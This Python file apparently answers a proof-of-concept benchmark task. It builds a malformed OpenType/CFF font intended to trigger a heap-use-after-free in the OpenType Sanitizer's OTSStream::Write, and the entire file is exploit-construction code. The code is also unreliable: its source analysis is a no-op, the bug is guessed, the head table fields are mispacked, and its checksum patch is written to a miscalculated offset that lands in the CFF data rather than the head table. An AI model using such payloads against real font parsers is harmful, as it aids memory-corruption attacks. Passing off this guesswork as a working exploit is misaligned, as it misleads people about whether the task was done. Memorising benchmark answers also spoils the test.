import os
import tarfile
import tempfile
import subprocess
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the source tarball to analyze the code
        with tempfile.TemporaryDirectory() as tmpdir:
            with tarfile.open(src_path, 'r') as tar:
                tar.extractall(tmpdir)
            
            # Look for relevant source files
            source_dir = os.path.join(tmpdir, os.listdir(tmpdir)[0])
            
            # Search for OTSStream implementation
            for root, _, files in os.walk(source_dir):
                for file in files:
                    if file.endswith('.cc') or file.endswith('.cpp'):
                        with open(os.path.join(root, file), 'r') as f:
                            content = f.read()
                            if 'OTSStream::Write' in content:
                                # Found relevant file - we can analyze it if needed
                                pass
            
            # Based on typical heap-use-after-free patterns in stream writers,
            # create a malformed OTF font that triggers the bug
            # The vulnerability is likely when the stream tries to write to
            # a buffer that was already freed
            
            # Build a minimal OTF font with specific structures to trigger the bug
            poc = self._build_otf_font()
            
            return poc
    
    def _build_otf_font(self) -> bytes:
        # Create a minimal OTF font with tables arranged to trigger
        # heap-use-after-free in OTSStream::Write
        
        # Font directory header
        scaler_type = struct.pack('>I', 0x4F54544F)  # OTTO - CFF font
        num_tables = struct.pack('>H', 3)  # 3 tables
        search_range = struct.pack('>H', 0)
        entry_selector = struct.pack('>H', 0)
        range_shift = struct.pack('>H', 0)
        
        # Table entries
        # 1. CFF table - will be corrupted
        cff_tag = b'CFF '
        cff_checksum = struct.pack('>I', 0)
        cff_offset = struct.pack('>I', 12 + 3*16)  # After directory
        cff_length = struct.pack('>I', 100)  # Small CFF table
        
        # 2. head table - required
        head_tag = b'head'
        head_checksum = struct.pack('>I', 0)
        head_offset = struct.pack('>I', 12 + 3*16 + 100)  # After CFF
        head_length = struct.pack('>I', 54)
        
        # 3. name table - to increase complexity
        name_tag = b'name'
        name_checksum = struct.pack('>I', 0)
        name_offset = struct.pack('>I', 12 + 3*16 + 100 + 54)  # After head
        name_length = struct.pack('>I', 500)  # Large enough to trigger reallocation
        
        # Build directory
        directory = (scaler_type + num_tables + search_range + 
                    entry_selector + range_shift +
                    cff_tag + cff_checksum + cff_offset + cff_length +
                    head_tag + head_checksum + head_offset + head_length +
                    name_tag + name_checksum + name_offset + name_length)
        
        # Build CFF table - corrupted to trigger UAF
        # Minimal CFF structure
        cff_header = struct.pack('>B', 1)  # major
        cff_header += struct.pack('>B', 0)  # minor
        cff_header += struct.pack('>B', 4)  # hdrSize
        cff_header += struct.pack('>B', 0)  # offSize
        
        # Name INDEX with invalid length to cause issues
        cff_name_index = struct.pack('>H', 1)  # count
        cff_name_index += struct.pack('>B', 1)  # offSize
        cff_name_index += struct.pack('>B', 0)  # offset[0]
        cff_name_index += struct.pack('>B', 4)  # offset[1] - points to 4 bytes
        
        # Top DICT INDEX with zero length to trigger edge case
        cff_dict_index = struct.pack('>H', 0)  # count = 0 (empty)
        cff_dict_index += struct.pack('>B', 1)  # offSize
        
        # String INDEX
        cff_string_index = struct.pack('>H', 0)  # count
        cff_string_index += struct.pack('>B', 1)  # offSize
        
        # Global Subr INDEX
        cff_subr_index = struct.pack('>H', 0)  # count
        cff_subr_index += struct.pack('>B', 1)  # offSize
        
        # CharStrings INDEX with problematic offset
        cff_charstrings = struct.pack('>H', 1)  # count
        cff_charstrings += struct.pack('>B', 255)  # Large offSize to cause overflow
        cff_charstrings += b'\x00' * 255  # Fill with zeros for offset calculation
        
        # Invalid data that will cause OTS to free buffers unexpectedly
        cff_data = cff_header + cff_name_index + cff_dict_index + cff_string_index
        cff_data += cff_subr_index + cff_charstrings
        
        # Pad to 100 bytes
        cff_data = cff_data.ljust(100, b'\x00')
        
        # Build head table
        head_data = struct.pack('>HHIIHH', 1, 0, 0, 0x5F0F3CF5, 0, 1000)  # version, rev, checksum, magic, flags, unitsPerEm
        head_data += struct.pack('>QQ', 0, 0)  # created, modified
        head_data += struct.pack('>hh', 0, 0)  # xMin, yMin
        head_data += struct.pack('>hh', 1000, 1000)  # xMax, yMax
        head_data += struct.pack('>HHhhH', 0, 0, 0, 0, 0)  # macStyle, lowestRec, fontDir, indexToLoc, glyphData
        
        # Build name table with alternating valid/invalid data
        name_data = struct.pack('>H', 0)  # format
        name_data += struct.pack('>H', 2)  # count
        name_data += struct.pack('>H', 6 + 2*12)  # stringStorage offset
        
        # Name records - first valid, second problematic
        # Platform 0 (Unicode), encoding 0, language 0, nameID 1, length 4, offset 0
        name_data += struct.pack('>HHH', 0, 0, 0)  # platformID, encodingID, languageID
        name_data += struct.pack('>HH', 1, 4)  # nameID, length
        name_data += struct.pack('>H', 0)  # offset
        
        # Platform 3 (Windows), encoding 1, language 0x0409, nameID 2, length 0xFFFF, offset 4
        name_data += struct.pack('>HHH', 3, 1, 0x0409)  # platformID, encodingID, languageID
        name_data += struct.pack('>HH', 2, 0xFFFF)  # Large length to cause issues
        name_data += struct.pack('>H', 4)  # offset
        
        # String storage
        name_data += b'Test'  # First string
        # Second string - corrupted data to trigger UAF during write
        name_data += b'\x00' * 500  # Fill with zeros
        
        # Ensure name table is exactly 500 bytes
        name_data = name_data.ljust(500, b'\x00')
        
        # Combine everything
        font_data = directory + cff_data + head_data + name_data
        
        # Add padding to reach 800 bytes (ground truth length)
        font_data = font_data.ljust(800, b'\x00')
        
        # Calculate checksums
        # Calculate head checksum (0xB1B0AFBA - sum of all font bytes)
        font_sum = 0
        for i in range(0, len(font_data), 4):
            chunk = font_data[i:i+4].ljust(4, b'\x00')
            font_sum = (font_sum + struct.unpack('>I', chunk)[0]) & 0xFFFFFFFF
        
        head_checksum_val = (0xB1B0AFBA - font_sum) & 0xFFFFFFFF
        
        # Update head table checksum
        head_checksum_offset = 12 + 16 + 100  # directory + CFF table offset
        font_data = (font_data[:head_checksum_offset + 8] + 
                    struct.pack('>I', head_checksum_val) +
                    font_data[head_checksum_offset + 12:])
        
        return font_data